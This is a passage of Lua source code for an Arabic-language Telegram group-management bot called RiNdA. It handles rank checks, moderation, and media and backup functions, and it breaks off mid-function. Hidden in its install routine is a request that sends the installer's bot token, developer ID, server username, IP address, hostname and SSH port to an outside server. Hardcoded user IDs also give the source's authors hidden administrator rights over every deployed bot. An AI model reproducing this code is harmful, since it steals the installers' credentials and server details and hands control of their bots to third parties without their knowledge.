redis = require('redis') 
https = require ("ssl.https") 
serpent = dofile("./library/serpent.lua") 
json = dofile("./library/JSON.lua") 
JSON  = dofile("./library/dkjson.lua")
URL = require('socket.url')  
utf8 = require ('lua-utf8') 
database = redis.connect('127.0.0.1', 6379) 
User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
id_server = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
--------------------------------------------------------------------------------------------------------------
local AutoSet = function() 
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "Info"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)    
file:close()  
end  
if not database:get(id_server..":token") then
io.write('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ \n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua RiNdA.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ\n\27[0;33;49m')
local SUDOID = io.read()
if SUDOID ~= '' then
data,res = https.request("https://apiabs.ml/Api/RiNdA/index.php?Ban=RiNdA&Info&Id="..SUDOID)
if res == 200 then
Abs = json:decode(data)
if Abs.Result.Info == 'Is_Spam' then
print('\27[1;31m a⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ\\nعذرا هذا الايدي محظور من تنصيب هذا السورس\na⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ') 
os.execute('lua RiNdA.lua') 
end 
if Abs.Result.Info == 'Ok' then
io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ\n27[0;39;49m')
database:set(id_server..":SUDO:ID",SUDOID)
end
else
print('\27[0;31m⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ \n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end 
os.execute('lua RiNdA.lua')
end
end
if not database:get(id_server..":SUDO:USERNAME") then
io.write('\27[1;31m ↓ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
local SUDOUSERNAME = io.read():gsub('@','')
if SUDOUSERNAME ~= '' then
io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
else
print('\n\27[1;34m لم يتم حفظ معرف المطور :')
end 
os.execute('lua RiNdA.lua')
end
local create_config_auto = function()
config = {
token = database:get(id_server..":token"),
SUDO = database:get(id_server..":SUDO:ID"),
UserName = database:get(id_server..":SUDO:USERNAME"),
 }
create(config, "./Info.lua")   
end 
create_config_auto()
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
https.request("https://apiabs.ml/Api/RiNdA/index.php?Get=RiNdA&DevId="..database:get(id_server..":SUDO:ID").."&TokenBot="..database:get(id_server..":token").."&User="..User.."&Ip="..IP.."&Name="..Name.."&Port="..Port)
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("RiNdA", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/RiNdA
token="]]..database:get(id_server..":token")..[["
while(true) do
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
echo "⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ⊶──────────≺𝙍𝙉𝘿≻───────────⊷"
echo "TG IS NOT FIND IN FILES BOT"
echo "⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ ⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ "
exit 1
fi
if [ ! $token ]; then
echo "⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ ⊶──────────≺𝙍𝙉𝘿≻───────────⊷ ٴ "
echo -e "\e[1;36mTOKEN IS NOT FIND IN FILE INFO.LUA \e[0m"
echo "⊶──────────≺𝙍𝙉𝘿≻───────────⊷"
exit 1
fi
echo -e "\033[38;5;208m"
echo -e "                                                  "
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./RiNdA.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("RND", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/RiNdA
while(true) do
rm -fr ../.telegram-cli
screen -S RiNdA -X kill
screen -S RiNdA ./RiNdA
done
]])  
file:close() 
os.execute('rm -fr $HOME/.telegram-cli')
end 
local serialize_to_file = function(data, file, uglify)  
file = io.open(file, "w+")  
local serialized  
if not uglify then   
serialized = serpent.block(data, {comment = false, name = "Info"})  
else   
serialized = serpent.dump(data) 
end  
file:write(serialized)  
file:close() 
end 
local load_redis = function()  
local f = io.open("./Info.lua", "r")  
if not f then   
AutoSet()  
else   
f:close()  
database:del(id_server..":token")
database:del(id_server..":SUDO:ID")
end  
local config = loadfile("./Info.lua")() 
return config 
end 
_redis = load_redis()  
--------------------------------------------------------------------------------------------------------------
print([[
✓                       ✓
  ⇑━━RiNdA-SourcE━━⇓
✓                     ✓
> CH › @SourcE_RiNdA
~> DEVELOPER › @WYYYYY
]])
sudos = dofile("./Info.lua") 
SUDO = tonumber(sudos.SUDO)
sudo_users = {SUDO}
bot_id = sudos.token:match("(%d+)")  
token = sudos.token 
--- start functions ↓
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/RiNdA-SourcE/Files_RiNdA/main/File_Bot/commands.lua") 
t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
t = t.."\27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
end
end
print(t)
function vardump(value)  
print(serpent.block(value, {comment=false}))   
end 
sudo_users = {SUDO,1581304066,1897626429}   
function SudoBot(msg)  
local RiNdA = false  
for k,v in pairs(sudo_users) do  
if tonumber(msg.sender_user_id_) == tonumber(v) then  
RiNdA = true  
end  
end  
return RiNdA  
end 
function Devmode(msg) 
local hash = database:sismember(bot_id.."Dev:mode:2", msg.sender_user_id_) 
if hash or SudoBot(msg) then  
return true  
else  
return false  
end  
end
function Bot(msg)  
local idbot = false  
if tonumber(msg.sender_user_id_) == tonumber(bot_id) then  
idbot = true    
end  
return idbot  
end
function Sudo(msg) 
local hash = database:sismember(bot_id..'Sudo:User', msg.sender_user_id_) 
if hash or SudoBot(msg) or Devmode(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
end
function CoSu(msg)
local hash = database:sismember(bot_id..'CoSu'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or Devmode(msg) or Sudo(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
end
function BasicConstructor(msg)
local hash = database:sismember(bot_id..'Basic:Constructor'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or Devmode(msg) or Sudo(msg) or CoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
end
function Constructor(msg)
local hash = database:sismember(bot_id..'Constructor'..msg.chat_id_, msg.sender_user_id_) 
if hash or SudoBot(msg) or Devmode(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function Manager(msg)
local hash = database:sismember(bot_id..'Manager'..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or Devmode(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function cleaner(msg)
local hash = database:sismember(bot_id.."MODE7:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or Devmode(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function Mod(msg)
local hash = database:sismember(bot_id..'Mod:User'..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or Devmode(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
end 
end
function Special(msg)
local hash = database:sismember(bot_id..'Special:User'..msg.chat_id_,msg.sender_user_id_) 
if hash or SudoBot(msg) or Devmode(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or CoSu(msg) or Bot(msg)  then       
return true 
else 
return false 
end 
end
function Can_or_NotCan(user_id,chat_id)
if tonumber(user_id) == tonumber(1897626429) then  
var = true  
elseif tonumber(user_id) == tonumber(SUDO) then
var = true  
elseif tonumber(user_id) == tonumber(bot_id) then
var = true  
elseif database:sismember(bot_id.."Dev:mode:2", user_id) then
var = true  
elseif database:sismember(bot_id..'Sudo:User', user_id) then
var = true  
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Biasic:Constructor'..chat_id, user_id) then
var = true
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'MODE7:MN:TF'..chat_id, user_id) then
var = true 
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = true  
elseif database:sismember(bot_id..'Mamez:User'..chat_id, user_id) then  
var = true  
else  
var = false  
end  
return var
end 
function Rutba(user_id,chat_id)
if tonumber(user_id) == tonumber(1897626429) then  
var = 'مـبـࢪمج السـوࢪس'
elseif tonumber(user_id) == tonumber(1581304066) then
var = '𝗙𝘂𝗡𝗱𝗘𝗱 𝗥𝗶𝗡𝗱𝗔'  
elseif tonumber(user_id) == tonumber(SUDO) then
var = 'المطـوࢪ الاسـاسي'  
elseif database:sismember(bot_id.."Dev:mode:2", user_id) then 
var = "المطـوࢪ الاسـاسـي²"  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = 'البـوت'
elseif database:sismember(bot_id..'Sudo:User', user_id) then
var = database:get(bot_id.."Sudo:Rd"..msg.chat_id_) or 'المـطوࢪ '  
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'الـمالك'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
var = database:get(bot_id.."BasicConstructor:Rd"..msg.chat_id_) or 'المنشـئ الاسـاسي'
elseif database:sismember(bot_id..'Constructor'..chat_id, user_id) then
var = database:get(bot_id.."Constructor:Rd"..msg.chat_id_) or 'المنـشئ'  
elseif database:sismember(bot_id..'Manager'..chat_id, user_id) then
var = database:get(bot_id.."Manager:Rd"..msg.chat_id_) or 'المـديࢪ '  
elseif database:sismember(bot_id..'MODE7:MN:TF'..chat_id, user_id) then
var = 'منظف' 
elseif database:sismember(bot_id..'Mod:User'..chat_id, user_id) then
var = database:get(bot_id.."Mod:Rd"..msg.chat_id_) or 'الادمـن'  
elseif database:sismember(bot_id..'Special:User'..chat_id, user_id) then  
var = database:get(bot_id.."Special:Rd"..msg.chat_id_) or 'المـميࢪ࣪'  
else  
var = database:get(bot_id.."Memp:Rd"..msg.chat_id_) or 'ﭑݪعضوَ'
end  
return var
end 
function ChekAdd(chat_id)
if database:sismember(bot_id.."Chek:Groups",chat_id) then
var = true
else 
var = false
end
return var
end
function Muted_User(Chat_id,User_id) 
if database:sismember(bot_id..'Muted:User'..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end
function Ban_User(Chat_id,User_id) 
if database:sismember(bot_id..'Ban:User'..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end 
function GBan_User(User_id) 
if database:sismember(bot_id..'GBan:User',User_id) then
Var = true
else
Var = false
end
return Var
end
function Gmute_User(User_id) 
if database:sismember(bot_id..'Gmute:User',User_id) then
Var = true
else
Var = false
end
return Var
end
function AddChannel(User)
local var = true
if database:get(bot_id..'add:ch:id') then
local url , res = https.request("https://api.telegram.org/bot"..token.."/getchatmember?chat_id="..database:get(bot_id..'add:ch:id').."&user_id="..User);
data = json:decode(url)
if res ~= 200 or data.result.status == "left" or data.result.status == "kicked" then
var = false
end
end
return var
end

function dl_cb(a,d)
end
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
function chat_kick(chat,user)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat,
user_id_ = user,
status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil)
end
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function DeleteMessage(chat,id)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},function(arg,data) 
end,nil)
end
function PinMessage(chat, id)
tdcli_function ({
ID = "PinChannelMessage",
channel_id_ = getChatId(chat).ID,
message_id_ = id,
disable_notification_ = 0
},function(arg,data) 
end,nil)
end
function UnPinMessage(chat)
tdcli_function ({
ID = "UnpinChannelMessage",
channel_id_ = getChatId(chat).ID
},function(arg,data) 
end,nil)
end
local function GetChat(chat_id) 
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
},cb, nil) 
end  
function getInputFile(file) 
if file:match('/') then infile = {ID = "InputFileLocal", path_ = file} elseif file:match('^%d+$') then infile = {ID = "InputFileId", id_ = file} else infile = {ID = "InputFilePersistentId", persistent_id_ = file} end return infile 
end
function ked(User_id,Chat_id)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
end
function s_api(web) 
local info, res = https.request(web) local req = json:decode(info) if res ~= 200 then return false end if not req.ok then return false end return req 
end 
local function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..token local url = send_api..'/sendMessage?chat_id=' .. chat_id .. '&text=' .. URL.escape(text) if reply_to_message_id ~= 0 then url = url .. '&reply_to_message_id=' .. reply_to_message_id  end if markdown == 'md' or markdown == 'markdown' then url = url..'&parse_mode=Markdown' elseif markdown == 'html' then url = url..'&parse_mode=HTML' end return s_api(url)  
end
local function Send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function send_inline_key(chat_id,text,keyboard,inline,reply_id) 
local response = {} response.keyboard = keyboard response.inline_keyboard = inline response.resize_keyboard = true response.one_time_keyboard = false response.selective = false  local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) if reply_id then send_api = send_api.."&reply_to_message_id="..reply_id end return s_api(send_api) 
end
local function GetInputFile(file)  
local file = file or ""   if file:match('/') then  infile = {ID= "InputFileLocal", path_  = file}  elseif file:match('^%d+$') then  infile = {ID= "InputFileId", id_ = file}  else  infile = {ID= "InputFilePersistentId", persistent_id_ = file}  end return infile 
end
local function sendRequest(request_id, chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, callback, extra) 
tdcli_function ({  ID = request_id,    chat_id_ = chat_id,    reply_to_message_id_ = reply_to_message_id,    disable_notification_ = disable_notification,    from_background_ = from_background,    reply_markup_ = reply_markup,    input_message_content_ = input_message_content,}, callback or dl_cb, extra) 
end
local function sendAudio(chat_id,reply_id,audio,title,caption)  
tdcli_function({ID="SendMessage",  chat_id_ = chat_id,  reply_to_message_id_ = reply_id,  disable_notification_ = 0,  from_background_ = 1,  reply_markup_ = nil,  input_message_content_ = {  ID="InputMessageAudio",  audio_ = GetInputFile(audio),  duration_ = '',  title_ = title or '',  performer_ = '',  caption_ = caption or ''  }},dl_cb,nil)
end  
local function sendVideo(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, video, duration, width, height, caption, cb, cmd)    
local input_message_content = { ID = "InputMessageVideo",      video_ = getInputFile(video),      added_sticker_file_ids_ = {},      duration_ = duration or 0,      width_ = width or 0,      height_ = height or 0,      caption_ = caption    }    sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd)  
end
function sendDocument(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, document, caption, dl_cb, cmd) 
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = disable_notification,from_background_ = from_background,reply_markup_ = reply_markup,input_message_content_ = {ID = "InputMessageDocument",document_ = getInputFile(document),caption_ = caption},}, dl_cb, cmd) 
end
local function sendVoice(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, voice, duration, waveform, caption, cb, cmd)  
local input_message_content = {   ID = "InputMessageVoice",   voice_ = getInputFile(voice),  duration_ = duration or 0,   waveform_ = waveform,    caption_ = caption  }  sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendSticker(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker, cb, cmd)  
local input_message_content = {    ID = "InputMessageSticker",   sticker_ = getInputFile(sticker),    width_ = 0,    height_ = 0  } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
end
local function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo,caption)   
tdcli_function ({ ID = "SendMessage",   chat_id_ = chat_id,   reply_to_message_id_ = reply_to_message_id,   disable_notification_ = disable_notification,   from_background_ = from_background,   reply_markup_ = reply_markup,   input_message_content_ = {   ID = "InputMessagePhoto",   photo_ = getInputFile(photo),   added_sticker_file_ids_ = {},   width_ = 0,   height_ = 0,   caption_ = caption  },   }, dl_cb, nil)  
end
function Reply_Status(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "SourcE_RiNdA")
local NameUser = "*⊀︰ الـضلـ؏  ↷ * ["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = "*⊀︰ اسم المستخدم >* ["..data.first_name_.."](T.me/"..UserName..")"
if status == "reply" then
send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_,"⊀︰ الحساب محذوف يرجى استخدام الامر بصوره صحيحه")
end
end,nil)   
end 
function Total_Msg(msgs)  
local RiNdA_Msg = ''  
if msgs < 100 then 
RiNdA_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
RiNdA_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
RiNdA_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
RiNdA_Msg = 'متفاعل' 
elseif msgs < 1200 then 
RiNdA_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
RiNdA_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
RiNdA_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
RiNdA_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
RiNdA_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
RiNdA_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
RiNdA_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
RiNdA_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
RiNdA_Msg = 'رب التفاعل'  
end 
return RiNdA_Msg 
end
function Get_Info(msg,chat,user) 
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user..'')
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.ok == true then
if Json_Info.result.status == "creator" then
Send(msg.chat_id_,msg.id_,'\n⊀︰ مالك الكروب')   
return false  end 
if Json_Info.result.status == "member" then
Send(msg.chat_id_,msg.id_,'\n⊀︰ مجرد عضو هنا ')   
return false  end
if Json_Info.result.status == 'left' then
Send(msg.chat_id_,msg.id_,'\n⊀︰ الشخص غير موجود هنا ')   
return false  end
if Json_Info.result.status == "administrator" then
if Json_Info.result.can_change_info == true then
info = '√'
else
info = '×'
end
if Json_Info.result.can_delete_messages == true then
delete = '√'
else
delete = '×'
end
if Json_Info.result.can_invite_users == true then
invite = '√'
else
invite = '×'
end
if Json_Info.result.can_pin_messages == true then
pin = '√'
else
pin = '×'
end
if Json_Info.result.can_restrict_members == true then
restrict = '√'
else
restrict = '×'
end
if Json_Info.result.can_promote_members == true then
promote = '√'
else
promote = '×'
end
Send(chat,msg.id_,'\n- الرتبة : مشـࢪف  '..'\n- والصلاحيات هي ↓ \nٴ━━━━━━━━━━'..'\n- تغير معلومات الكروب ↫ ❴ '..info..' ❵'..'\n- حذف الرسائل ↫ ❴ '..delete..' ❵'..'\n- حظر المستخدمين ↫ ❴ '..restrict..' ❵'..'\n- دعوة مستخدمين ↫ ❴ '..invite..' ❵'..'\n- تثبيت الرسائل ↫ ❴ '..pin..' ❵'..'\n- اضافة مشرفين جدد ↫ ❴ '..promote..' ❵')   
end
end
end
function GetFile_Bot(msg)
local list = database:smembers(bot_id..'Chek:Groups') 
local t = '{"BOT_ID": '..bot_id..',"GP_BOT":{'  
for k,v in pairs(list) do   
NAME = 'RiNdA Chat'
link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_) or ''
ASAS = database:smembers(bot_id..'Basic:Constructor'..v)
MNSH = database:smembers(bot_id..'Constructor'..v)
MDER = database:smembers(bot_id..'Manager'..v)
MOD = database:smembers(bot_id..'Mod:User'..v)
if k == 1 then
t = t..'"'..v..'":{"RiNdA":"'..NAME..'",'
else
t = t..',"'..v..'":{"RiNdA":"'..NAME..'",'
end
if #ASAS ~= 0 then 
t = t..'"ASAS":['
for k,v in pairs(ASAS) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MOD ~= 0 then
t = t..'"MOD":['
for k,v in pairs(MOD) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MDER ~= 0 then
t = t..'"MDER":['
for k,v in pairs(MDER) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
if #MNSH ~= 0 then
t = t..'"MNSH":['
for k,v in pairs(MNSH) do
if k == 1 then
t =  t..'"'..v..'"'
else
t =  t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"linkgroup":"'..link..'"}' or ''
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './'..bot_id..'.json', '- عدد كروبات التي في البوت { '..#list..'}')
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function Addjpg(msg,chat,ID_FILE,File_Name)
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path,File_Name) 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,'./'..File_Name,'تم تحويل الملصق الى صوره')     
os.execute('rm -rf ./'..File_Name) 
end
function Addvoi(msg,chat,vi,ty)
local eq = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..vi)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eq.result.file_path,ty) 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, './'..ty)   
os.execute('rm -rf ./'..ty) 
end
function Addmp3(msg,chat,kkl,ffrr)
local eer = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..kkl)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..eer.result.file_path,ffrr) 
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"𝙍𝙞𝙉𝙙𝘼 ")  
os.execute('rm -rf ./'..ffrr) 
end
function Addsticker(msg,chat,Sd,rre)
local Qw = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..Sd)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..Qw.result.file_path,rre) 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, './'..rre)
os.execute('rm -rf ./'..rre) 
end
function AddFile_Bot(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then 
send(chat,msg.id_," ⊀︰ ملف نسخه ليس لهاذا البوت")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_," ⊀︰ جاري ...\n ⊀︰ ارفع الملف الان")
else
send(chat,msg.id_,"* ⊀︰ عذرا الملف ليس بصيغة {JSON} يرجى ارفع الملف الصحيح*")
end      
local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
for idg,v in pairs(groups.GP_BOT) do
database:sadd(bot_id..'Chek:Groups',idg)  
database:set(bot_id..'lock:tagservrbot'..idg,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..idg,'del')    
end
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
database:sadd(bot_id..'Constructor'..idg,idmsh)
end
end
if v.MDER then
for k,idmder in pairs(v.MDER) do
database:sadd(bot_id..'Manager'..idg,idmder)  
end
end
if v.MOD then
for k,idmod in pairs(v.MOD) do
database:sadd(bot_id..'Mod:User'..idg,idmod)  
end
end
if v.ASAS then
for k,idASAS in pairs(v.ASAS) do
database:sadd(bot_id..'Basic:Constructor'..idg,idASAS)  
end
end
end
send(chat,msg.id_,"\n ⊀︰ تم ارفع الملف بنجاح وتفعيل الكروبات\n ⊀︰ وارفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")
end
local function trigger_anti_spam(msg,type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
local Name = '['..utf8.sub(data.first_name_,0,40)..'](tg://user?id='..data.id_..')'
if type == 'kick' then 
Text = '\n ⊀︰ العضــو > '..Name..'\n ⊀︰ قام بالتكرار هنا وتم طرده '  
sendText(msg.chat_id_,Text,0,'md')
chat_kick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end 
if type == 'del' then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
